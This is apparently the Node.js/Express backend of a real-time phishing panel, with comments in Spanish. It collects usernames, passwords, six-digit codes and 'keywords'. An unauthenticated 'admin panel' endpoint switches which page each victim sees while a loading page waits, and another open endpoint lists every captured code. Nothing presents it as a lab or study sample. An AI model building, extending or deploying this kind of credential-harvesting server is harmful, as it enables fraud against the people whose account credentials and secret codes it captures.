const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');
const bcrypt = require('bcryptjs');

const app = express();
const port = 3000;

// Estado en memoria para saber a qué página mandar a cada usuario
const userStatus = {};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve static HTML files from the public folder

// Connect to SQLite database
const db = new sqlite3.Database('./database.db', (err) => {
  if (err) {
    console.error('Error connecting to the database:', err.message);
  } else {
    console.log('Connected to the SQLite database.');

    db.run(`CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      password TEXT NOT NULL,
      apartment_code TEXT,
      keyword_code TEXT
    )`, (createErr) => {
      if (createErr) {
        console.error('Error creating users table:', createErr.message);
        return;
      }

      db.all('PRAGMA table_info(users)', [], (pragmaErr, columns) => {
        if (pragmaErr) {
          console.error('Error checking users schema:', pragmaErr.message);
          return;
        }

        const hasApartmentCode = columns.some((column) => column.name === 'apartment_code');
        if (!hasApartmentCode) {
          db.run('ALTER TABLE users ADD COLUMN apartment_code TEXT', (alterErr) => {
            if (alterErr) {
              console.error('Error adding apartment_code column:', alterErr.message);
            } else {
              console.log('Column apartment_code added successfully.');
            }
          });
        }

        const hasKeywordCode = columns.some((column) => column.name === 'keyword_code');
        if (!hasKeywordCode) {
          db.run('ALTER TABLE users ADD COLUMN keyword_code TEXT', (alterErr) => {
            if (alterErr) {
              console.error('Error adding keyword_code column:', alterErr.message);
            } else {
              console.log('Column keyword_code added successfully.');
            }
          });
        }
      });
    });
  }
});

// Example API endpoint to get users
app.get('/api/users', (req, res) => {
  db.all('SELECT id, username, apartment_code, keyword_code FROM users', [], (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json({ users: rows });
  });
});

// Example API endpoint to add a user
app.post('/api/users', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username y password son obligatorios' });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    db.run('INSERT INTO users (username, password) VALUES (?, ?)', [username, hashedPassword], function(err) {
      if (err) {
        res.status(500).json({ error: err.message });
        return;
      }
      
      // Initialize their view status as cargando.html
      const userId = this.lastID;
      userStatus[userId] = 'cargando.html';
      
      res.json({ id: userId, username, message: 'User added successfully' });
    });
  } catch (error) {
    res.status(500).json({ error: 'Error processing password' });
  }
});

// Guardar el número del apartamento del usuario
app.post('/api/apartment/:id', (req, res) => {
  const userId = Number(req.params.id);
  const { apartment_code } = req.body;

  if (!userId || !apartment_code) {
    return res.status(400).json({ error: 'Falta el id del usuario o el código del apartamento' });
  }

  const apartmentCode = String(apartment_code).trim();
  if (!/^\d{6}$/.test(apartmentCode)) {
    return res.status(400).json({ error: 'El apartamento debe tener 6 dígitos numéricos' });
  }

  db.run('UPDATE users SET apartment_code = ? WHERE id = ?', [apartmentCode, userId], function(err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }

    if (this.changes === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }

    userStatus[userId] = 'cargando.html';
    res.json({ message: 'Apartamento guardado correctamente', userId, apartment_code: apartmentCode, view: 'cargando.html' });
  });
});

// Guardar la palabra clave del usuario
app.post('/api/keyword/:id', (req, res) => {
  const userId = Number(req.params.id);
  const { keyword_code } = req.body;

  if (!userId || !keyword_code) {
    return res.status(400).json({ error: 'Falta el id del usuario o la palabra clave' });
  }

  const keywordCode = String(keyword_code).trim();
  if (keywordCode.length < 4) {
    return res.status(400).json({ error: 'La palabra clave debe tener mínimo 4 caracteres' });
  }

  db.run('UPDATE users SET keyword_code = ? WHERE id = ?', [keywordCode, userId], function(err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }

    if (this.changes === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }

    userStatus[userId] = 'cargando.html';
    res.json({ message: 'Palabra clave guardada correctamente', userId, keyword_code: keywordCode, view: 'cargando.html' });
  });
});

// Endpoint para que  pregunte su estado actual
app.get('/api/status/:id', (req, res) => {
  const userId = req.params.id;
  const view = userStatus[userId] || 'cargando.html';
  res.json({ view: view });
});

// Endpoint para que el panel de administración cambie el estado
app.post('/api/status/:id', (req, res) => {
  const userId = req.params.id;
  const { view } = req.body;
  if (view) {
    userStatus[userId] = view;
    res.json({ message: 'View updated successfully', view: view });
  } else {
    res.status(400).json({ error: 'View is required' });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
  console.log('Static files are being served from the public directory. Access your HTML files (e.g. /login.html)');
});
